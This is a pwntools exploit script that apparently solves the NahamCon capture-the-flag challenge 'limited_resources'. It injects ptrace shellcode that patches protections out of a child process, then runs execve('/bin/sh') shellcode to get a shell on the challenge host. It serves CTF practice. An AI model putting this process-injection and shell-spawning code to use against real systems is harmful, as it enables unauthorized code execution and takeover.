#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/limited_resources"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "challenge.nahamcon.com", 32181
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][2]
            cmd = choosen_gdb + """
            b *main+0x2e2
            set follow-fork-mode child
            """
            gdb.attach(io, gdbscript=cmd)
    io.sendlineafter(b"Exit\n", b"2")
    io.recvuntil(b"PID = ")
    pid = int(io.recvuntil(b"\n", drop=True).decode())

    # This shellcode is taken from the writeup by nobodyisnobody orz.
    ptrace_shellcode = asm('''
    looping:

      mov ebp,%d        /* ebp = pid of child */
    // ptrace(PTRACE_ATTACH,child,0,0)
      mov edi,0x10
      mov esi,ebp
      xor edx,edx
      xor r10,r10
      mov eax,101
      syscall

    // wait a bit
      mov rcx,0xffffffff
    wait:
      nop
      nop
      loop wait

    /* patch program to remove jmp after call to sleep() */
    /* ptrace(PTRACE_POKEDATA,chid, addr, data */
      mov edi,5
      mov esi,ebp
      mov edx,0x4018df
      mov r10,0xE800402090bf9090
      mov eax,101
      syscall

    /* patch program to remove call to protectprogram() */
    /* ptrace(PTRACE_POKEDATA,chid, addr, data */
      mov edi,5
      mov esi,ebp
      mov edx,0x401aa9
      mov r10,0x9090909090000000
      mov eax,101
      syscall

    // ptrace(PTRACE_DETACH,child,0,0
      mov edi,0x11
      mov esi,ebp
      xor edx,edx
      xor r10,r10
      mov eax,101
      syscall


    loopit:
     jmp loopit

    format:
      .ascii "result = %%llx"
      .byte 10

    ''' % pid)

    io.sendlineafter(b'Exit\n',b'1')
    io.sendlineafter(b'?\n', str(0x5000).encode())
    io.sendlineafter(b'?\n', str(7).encode()) # READ | WRITE | EXECUTE
    io.sendlineafter(b'?\n', ptrace_shellcode)

    io.recvuntil(b"buffer at ")
    address = int(io.recvuntil(b"\n", drop=True).decode(), 16)
    print("address                  :", hex(address))

    io.sendlineafter(b'Exit\n',b'3')
    io.sendlineafter(b'?\n', hex(address).encode())


    # === prepare shellcode for: sys_execve("/bin/sh", NULL, NULL)

    shellcode_execve = asm('''
        mov rbx, 0x68732f2f6e69622f
        xor esi, esi
        push rsi
        push rbx
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov rax, 0x3b
        syscall
      ''')

    io.sendlineafter(b'Exit\n',b'1')
    io.sendlineafter(b'?\n', str(0x1000).encode())
    io.sendlineafter(b'?\n', str(7).encode()) # READ | WRITE | EXECUTE
    io.sendlineafter(b'?\n', shellcode_execve)

    io.recvuntil(b"buffer at ")
    address = int(io.recvuntil(b"\n", drop=True).decode(), 16)
    print("address                  :", hex(address))

    io.sendlineafter(b'Exit\n',b'3')
    io.sendlineafter(b'?\n', hex(address).encode())

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
